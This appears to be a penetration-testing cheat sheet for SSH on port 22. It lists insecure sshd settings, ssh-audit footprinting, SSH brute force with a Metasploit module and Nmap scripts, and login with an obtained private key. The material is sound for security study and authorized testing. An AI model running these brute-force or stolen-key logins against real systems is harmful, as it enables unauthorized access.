# SSH - T22

### Default Configuration

* `cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'`&#x20;

### Dangerous Settings <a href="#dangerous-settings" id="dangerous-settings"></a>

* <table data-header-hidden><thead><tr><th width="252.428466796875">Setting</th><th>Description</th></tr></thead><tbody><tr><td><code>PasswordAuthentication yes</code></td><td>Allows password-based authentication.</td></tr><tr><td><code>PermitEmptyPasswords yes</code></td><td>Allows the use of empty passwords.</td></tr><tr><td><code>PermitRootLogin yes</code></td><td>Allows to log in as the root user.</td></tr><tr><td><code>Protocol 1</code></td><td>Uses an outdated version of encryption.</td></tr><tr><td><code>X11Forwarding yes</code></td><td>Allows X11 forwarding for GUI applications.</td></tr><tr><td><code>AllowTcpForwarding yes</code></td><td>Allows forwarding of TCP ports.</td></tr><tr><td><code>PermitTunnel</code></td><td>Allows tunneling.</td></tr><tr><td><code>DebianBanner yes</code></td><td>Displays a specific banner when logging in.</td></tr></tbody></table>

### Footprinting

{% tabs %}
{% tab title="ssh-audit" %}
{% code lineNumbers="true" %}
```shellscript
ssh-audit.py <IP>
```
{% endcode %}
{% endtab %}

{% tab title="Nmap" %}
{% code lineNumbers="true" %}
```
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Change Authentication Method

* `ssh -v <username>@<IP>`
* `ssh -v <username>@<IP> -o PreferredAuthentications=password`

### Brute Force

{% tabs %}
{% tab title="Metasploit" %}
{% code lineNumbers="true" fullWidth="false" %}
```shellscript
use auxiliary/scanner/ssh/ssh_login
set rhosts <ip>
services -p 22 -R
set username <>
set password <>
```
{% endcode %}
{% endtab %}

{% tab title="Nmap" %}
```shellscript
nmap -p 22 --script ssh-brute <ip>
nmap -p 22 --script "ssh*" <ip>
```
{% endtab %}
{% endtabs %}

### Login using Private Key

{% code lineNumbers="true" %}
```shellscript
After obtainiing ssh private key
chmod 600 id_rsa
ssh -i id_rsa username@<IP>
```
{% endcode %}

### Tools

* [ssh-audit](https://github.com/jtesta/ssh-audit)

